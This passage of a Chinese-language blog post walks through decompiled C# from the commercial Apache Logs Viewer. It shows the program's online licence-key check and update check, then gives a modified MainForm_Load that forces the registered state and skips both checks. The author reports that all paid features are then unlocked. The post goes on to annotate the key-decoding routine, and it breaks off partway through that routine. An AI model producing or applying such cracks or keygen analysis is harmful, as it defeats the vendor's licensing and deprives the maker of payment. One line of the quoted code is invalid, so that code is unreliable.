class="line">ALV.Common.Debug.Error(<span class="string">&quot;Error Load: &quot;</span> + ex.Message);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0 == <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = <span class="keyword">new</span> Prefs();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">LoadForm.smethod_1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.checkupdates)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_25)).Start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.bool_1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(Prefs.Filename + <span class="string">&quot;.chk&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Config Check&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (File.ReadAllText(Prefs.Filename + <span class="string">&quot;.chk&quot;</span>) == <span class="string">&quot;0&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_53(), <span class="string">&quot;Apache Logs Viewer&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = <span class="built_in">string</span>.Empty;</span><br><span class="line"><span class="keyword">this</span>.unlockCodeToolStripMenuItem_Click(<span class="keyword">this</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (File.Exists(Prefs.Filename + <span class="string">&quot;.chk&quot;</span>) &amp;&amp; <span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">Application.Exit();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_23)).Start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_23)).Start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Interval = <span class="keyword">this</span>.prefs_0.refreshtimeout * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Enabled = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Start();</span><br><span class="line">GC.Collect();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Width &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = <span class="number">668</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Height &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = <span class="number">460</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Visible = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnScroll.CheckState = (<span class="keyword">this</span>.prefs_0.scroll_last ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnRefresh.CheckState = (<span class="keyword">this</span>.prefs_0.refreshAuto ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Started..OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>method_23</code>、<code>method_24</code>方法用作反馈<code>winstore</code>版本</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_23</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.bool_1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_24(<span class="string">&quot;winStore&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.method_24(<span class="keyword">this</span>.prefs_0.Key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_24</span>(<span class="params"><span class="built_in">string</span> string_0</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">WebClient webClient = <span class="keyword">new</span> WebClient();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (webClient.DownloadString(<span class="string">&quot;http://www.apacheviewer.com/k/c5.php?k=&quot;</span> + string_0 + <span class="string">&quot;&amp;id=&quot;</span> + <span class="keyword">this</span>.prefs_0.InstallID).StartsWith(<span class="string">&quot;failed&quot;</span>, StringComparison.OrdinalIgnoreCase))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">using</span> (StreamWriter streamWriter = File.CreateText(Prefs.Filename + <span class="string">&quot;.chk&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">streamWriter.Write(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">base</span>.Invoke(<span class="keyword">new</span> MainForm.Delegate0(<span class="keyword">this</span>.method_26), <span class="keyword">new</span> <span class="built_in">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">5</span>,</span><br><span class="line"><span class="built_in">string</span>.Empty</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(Prefs.Filename + <span class="string">&quot;.chk&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">File.Delete(Prefs.Filename + <span class="string">&quot;.chk&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">((IDisposable)webClient).Dispose();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>method_25</code>、<code>method_26</code>用作检测更新</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method_25</span>()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> text = <span class="literal">null</span>;</span><br><span class="line">WebClient webClient = <span class="keyword">new</span> WebClient();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">text = webClient.DownloadString(<span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;http://www.apacheviewer.com/currentver5.php?v=&quot;</span>,</span><br><span class="line">About.double_0,</span><br><span class="line"><span class="string">&quot;&amp;r1=U&amp;id=&quot;</span>,</span><br><span class="line"><span class="keyword">this</span>.prefs_0.InstallID</span><br><span class="line">&#125;));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">text = webClient.DownloadString(<span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;http://www.apacheviewer.com/currentver5.php?v=&quot;</span>,</span><br><span class="line">About.double_0,</span><br><span class="line"><span class="string">&quot;&amp;r1=F&amp;id=&quot;</span>,</span><br><span class="line"><span class="keyword">this</span>.prefs_0.InstallID</span><br><span class="line">&#125;));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">((IDisposable)webClient).Dispose();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">double</span> num = <span class="number">0.0</span>;</span><br><span class="line"><span class="built_in">double</span>.TryParse(text, NumberStyles.Any, CultureInfo.InvariantCulture, <span class="keyword">out</span> num);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0.0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num &gt; About.double_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num &gt;= (<span class="built_in">double</span>)About.int_0)</span><br><span class="line">&#123;</span><br><span class="line">WebClient webClient2 = <span class="keyword">new</span> WebClient();</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">text = webClient2.DownloadString(<span class="string">&quot;http://www.apacheviewer.com/upgrademsg.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">((IDisposable)webClient2).Dispose();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">base</span>.Invoke(<span class="keyword">new</span> MainForm.Delegate0(<span class="keyword">this</span>.method_26), <span class="keyword">new</span> <span class="built_in">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">2</span>,</span><br><span class="line">text.Trim()</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Invoke(<span class="keyword">new</span> MainForm.Delegate0(<span class="keyword">this</span>.method_26), <span class="keyword">new</span> <span class="built_in">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line">text.Trim()</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">method_26</span>(<span class="params"><span class="built_in">int</span> int_0, <span class="built_in">string</span> string_0</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (int_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> (MessageBox.Show(<span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">string</span>[]</span><br><span class="line">&#123;</span><br><span class="line">Class96.smethod_42(),</span><br><span class="line"><span class="string">&quot; v&quot;</span>,</span><br><span class="line">string_0,</span><br><span class="line"><span class="string">&quot; &quot;</span>,</span><br><span class="line">Class96.smethod_93(),</span><br><span class="line"><span class="string">&quot;.\r\n &quot;</span>,</span><br><span class="line">Class96.smethod_66()</span><br><span class="line">&#125;), <span class="string">&quot;Apache Logs Viewer &quot;</span> + Class96.smethod_265(), MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)</span><br><span class="line">&#123;</span><br><span class="line">Process.Start(<span class="string">&quot;http://www.apacheviewer.com/download.php?up=1&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> (MessageBox.Show(string_0 + <span class="string">&quot;\r\n&quot;</span> + Class96.smethod_66(), <span class="string">&quot;Apache Logs Viewer &quot;</span> + Class96.smethod_265(), MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)</span><br><span class="line">&#123;</span><br><span class="line">Process.Start(<span class="string">&quot;http://www.apacheviewer.com/download.php?up=1&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">goto</span> IL_BD;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">MessageBox.Show(Class96.smethod_123(), <span class="string">&quot;Apache Logs Viewer&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);</span><br><span class="line">Process.Start(<span class="string">&quot;http://www.apacheviewer.com&quot;</span>);</span><br><span class="line">Application.Exit();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="literal">default</span>:</span><br><span class="line"><span class="keyword">goto</span> IL_BD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">IL_BD:</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">&quot;Unknown Update UI Command&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以把<code>MainForm_Load</code>方法直接修改为如下即可跳过验证和更新</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">MainForm_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_2)</span><br><span class="line">&#123;</span><br><span class="line">Prefs.DeletePrefs();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Started..&quot;</span>);</span><br><span class="line">Prefs prefs = Prefs.Load(Prefs.Filename);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(prefs.InstallID))</span><br><span class="line">&#123;</span><br><span class="line">prefs.InstallID = Guid.NewGuid().ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizex &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = prefs.sizex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizey &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = prefs.sizey;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.maximised)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.WindowState = FormWindowState.Maximized;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.x &gt;= <span class="number">0</span> &amp;&amp; prefs.y &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Location = <span class="keyword">new</span> Point(prefs.x, prefs.y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = prefs;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.logColumns == <span class="literal">null</span> || <span class="keyword">this</span>.prefs_0.logColumns.Count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.logColumns = LogColumn.ResetLogColumns();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Loading Custom Columns&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.prefsColumns_0 = PrefsColumns.Load(PrefsColumns.Filename);</span><br><span class="line"><span class="keyword">this</span>.method_42();</span><br><span class="line">DummyListView.prefs = prefs;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Loading IP DB&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.ip2Country_0 = <span class="keyword">new</span> IP2Country(<span class="literal">true</span>, <span class="keyword">this</span>.prefs_0.useCity);</span><br><span class="line"><span class="keyword">this</span>.parser_0 = <span class="keyword">new</span> Parser(<span class="keyword">this</span>.ip2Country_0);</span><br><span class="line"><span class="keyword">this</span>.parser_0.ParseCustomColumns = <span class="keyword">this</span>.prefs_0.parseCustomColumns;</span><br><span class="line">Statistics.int_0 = <span class="keyword">this</span>.prefs_0.topNumber;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (prefs.monitorAuto)</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Opening Logs...&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (LoggerInfo loggerInfo <span class="keyword">in</span> prefs.logsToView)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (loggerInfo.Highlight != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_48(loggerInfo.Highlight, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_6(loggerInfo);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class95.list_0 != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="built_in">string</span> text <span class="keyword">in</span> Class95.list_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">bool</span> flag = <span class="keyword">this</span>.parser_0.IsErrorLog(text);</span><br><span class="line"><span class="keyword">this</span>.method_4(text, !flag, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(Class96.smethod_247());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.selTab &gt;= <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.tabControl1.TabPages.Count &gt; <span class="keyword">this</span>.prefs_0.selTab)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.tabControl1.SelectedTabPageIndex = <span class="keyword">this</span>.prefs_0.selTab;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(<span class="keyword">this</span>.prefs_0.Key))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> string_ = Class2.smethod_0(<span class="keyword">this</span>.prefs_0.Key);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (IsStoreApp.IsWindowsStoreApp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.bool_1 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.method_0();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.bool_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">&quot; Apache Logs Viewer...&quot;</span> + Class96.smethod_67();</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_270() + <span class="string">&quot; Apache Logs Viewer&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Apply L...&quot;</span>);</span><br><span class="line"><span class="keyword">this</span>.method_44(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">this</span>.method_1();</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Apply L Done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Error(<span class="string">&quot;Error Load: &quot;</span> + ex.Message);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0 == <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = <span class="keyword">new</span> Prefs();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">LoadForm.smethod_1();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.checkupdates)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadStart(<span class="keyword">this</span>.method_25)).Start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Interval = <span class="keyword">this</span>.prefs_0.refreshtimeout * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Enabled = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.timer_0.Start();</span><br><span class="line">GC.Collect();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Width &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = <span class="number">668</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Height &lt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = <span class="number">460</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Visible = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnScroll.CheckState = (<span class="keyword">this</span>.prefs_0.scroll_last ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line"><span class="keyword">this</span>.toolStripBtnRefresh.CheckState = (<span class="keyword">this</span>.prefs_0.refreshAuto ? CheckState.Checked : CheckState.Unchecked);</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">&quot;Started..OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新打开后，显示为已注册，所有功能已解锁</p><p><img src="/images/1563952799941.png" alt="1563952799941"></p><p><img src="/images/1563952927165.png"></p><h1 id="注册算法"><a href="#注册算法" class="headerlink" title="注册算法"></a>注册算法</h1><p>该软件的注册算法如下</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Globalization;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000017 RID: 23</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Class2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Token: 0x0600008E RID: 142 RVA: 0x0000C090 File Offset: 0x0000A290</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">smethod_0</span>(<span class="params"><span class="built_in">string</span> string_0</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string_0.IndexOf(<span class="string">&#x27;-&#x27;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> string_0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> str = <span class="string">&quot;DBV&quot;</span>;</span><br><span class="line">string_0 = string_0.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty); <span class="comment">//把-置换为空</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;4&#x27;</span>); <span class="comment">//把Q置换为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;4&#x27;</span>); <span class="comment">//把G置换为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;0&#x27;</span>); <span class="comment">//把V置换为0</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;3&#x27;</span>); <span class="comment">//把N置换为3</span></span><br><span class="line">str + string_0; <span class="comment">//DBV+置换后的</span></span><br><span class="line"><span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[string_0.Length / <span class="number">2</span>];<span class="comment">//新建个数组，长度是传入的字符串的一半</span></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; string_0.Length; i += <span class="number">2</span>)<span class="comment">//步长2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span> b;</span><br><span class="line"><span class="built_in">byte</span>.TryParse(<span class="keyword">new</span> <span class="built_in">string</span>(<span class="keyword">new</span> <span class="built_in">char</span>[]&#123;string_0[i],string_0[i + <span class="number">1</span>]&#125;),NumberStyles.HexNumber, CultureInfo.InvariantCulture, <span class="keyword">out</span> b);</span><br><span class="line">array[i / <span class="number">2</span>] = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> text = Encoding.ASCII.GetString(array);</span><br><span class="line">text = text.Insert(<span class="number">1</span>, <span class="string">&quot;:&quot;</span>);<span class="comment">//在第1个字符后插入:</span></span><br><span class="line">text = text.Insert(<span class="number">5</span>, <span class="string">&quot;:&quot;</span>);<span class="comment">//在第5个字符后插入:</span></span><br><span class="line">text = text.Insert(<span class="number">9</span>, <span class="string">&quot;:&quot;</span>);<span class="comment">//在第9个字符后插入:</span></span><br><span class="line"><span class="keyword">if</span> (text.Length &gt; <span class="number">13</span>)<span class="comment">//如果长度超过13，在第14个字符后插入:</span></span><br><span class="line">&#123;</span><br><span class="line">text = text.Insert(<span class="number">13</span>, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x0600008F RID: 143 RVA: 0x0000C1A0 File Offset: 0x0000A3A0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// HexNumber = 515</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">smethod_1</span>(<span class="params"><span class="built_in">string</span> string_0</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">string</span> a = string_0.Substring(<span class="number">4</span>, <span class="number">5</span>);<span class="comment">//第5位开始截取5个字符</span></span><br><span class="line"><span class="keyword">if</span> (a == <span class="string">&quot;IALV&quot;</span>)<span class="comment">//如果5~9的字符为IALV flag为假</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (string_0[<span class="number">0</span>] != <span class="string">&#x27;F&#x27;</span>)<span 